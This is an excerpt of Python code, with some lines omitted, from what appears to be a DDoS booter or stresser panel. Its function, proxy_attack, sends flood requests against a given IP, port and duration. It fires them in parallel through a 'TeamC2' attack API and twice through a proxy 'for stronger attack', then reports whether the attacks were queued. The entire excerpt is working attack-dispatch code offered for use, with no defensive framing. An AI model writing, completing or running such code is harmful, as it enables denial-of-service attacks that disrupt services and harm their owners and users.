...
def proxy_attack(ip, port, time_sec):
    """
    Send attack request to:
      1. TeamC2 API (1x)
      2. proxy.py (2x — double hit for stronger attack)
    All fire in parallel; return combined status.
    """
    results = {"teamc2": None, "proxy_1": None, "proxy_2": None}

    def call_teamc2():
        try:
            url = f"{ATTACK_API_BASE}/api/attack?api_key={ATTACK_API_KEY}&target={ip}&port={port}&time={time_sec}&concurrent=1"
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    results["teamc2"] = {"status": "queued", "message": data.get("message", "")}
                else:
                    results["teamc2"] = {"status": "error", "message": data.get("message", "Attack failed")}
            else:
                results["teamc2"] = {"status": "error", "message": f"Server returned {r.status_code}"}
        except Exception as e:
            results["teamc2"] = {"status": "error", "message": str(e)}
    ...
    def call_proxy(slot):
        try:
            ...
            if r.status_code == 200:
                data = r.json()
                results[slot] = {"status": data.get("status", "error"), "message": data.get("message", "")}
            else:
                results[slot] = {"status": "error", "message": f"Proxy returned {r.status_code}"}
        except Exception as e:
            results[slot] = {"status": "error", "message": str(e)}

    # Fire all 3 in parallel: TeamC2 once + proxy.py twice
    threads = [
        threading.Thread(target=call_teamc2),
    ...
    # Combine result — success if any one queued
    teamc2_ok = results["teamc2"] and results["teamc2"].get("status") == "queued"
    ...
    if teamc2_ok or proxy1_ok or proxy2_ok:
        msgs = []
        if teamc2_ok: msgs.append("TeamC2: " + results["teamc2"].get("message", "queued"))
        if proxy1_ok: msgs.append("Proxy#1: " + results["proxy_1"].get("message", "queued"))
        if proxy2_ok: msgs.append("Proxy#2: " + results["proxy_2"].get("message", "queued"))
        return {
            "status": "queued",
    ...
    # All failed
    err_msgs = []
    if results["teamc2"]: err_msgs.append("TeamC2: " + results["teamc2"].get("message", "failed"))
